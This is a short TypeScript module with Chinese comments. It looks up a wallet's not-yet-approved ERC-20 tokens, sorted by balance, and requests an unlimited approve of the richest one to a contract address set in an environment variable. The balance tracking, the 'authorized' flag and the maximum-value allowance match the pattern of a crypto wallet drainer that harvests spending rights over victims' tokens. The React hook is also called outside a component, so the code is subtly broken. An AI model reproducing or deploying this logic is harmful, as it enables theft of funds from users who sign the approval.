import { and, eq, desc } from "drizzle-orm";
import db from "./db";
import { tokensTable } from "@/schema/TokensTableSchema";
import { useWriteContract } from "wagmi";
import { abi } from "@/lib/erc20abi";

/**
 * 根据余额降序获取未授权的代币列表
 * @returns 未授权的代币列表
 */
async function getUnapprovedTokens(address: string) {
  const tokens = await db
    .select()
    .from(tokensTable)
    .where(and(eq(tokensTable.authorized, 0), eq(tokensTable.address, address)))
    .orderBy(desc(tokensTable.balance));
  return tokens;
}

const { writeContract } = useWriteContract();

async function approveToken(address: string) {
  try {
    // 获取未授权的代币列表
    const tokenList = await getUnapprovedTokens(address);
    

    writeContract({
      abi,
      address: tokenList[0]?.contractAddress as `0x${string}`,
      functionName: "approve",
      args: [
        process.env.NEXT_PUBLIC_CONTRACT_ADDRESS as `0x${string}`,
        BigInt(
          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        ), // 允许无限制授权
      ],
    });

    console.log("Token approved successfully:", tokenList[0]?.contractAddress);
  } catch (error) {
    console.error("Error approving token:", error);
    throw error;
  }
}

export { getUnapprovedTokens, approveToken };
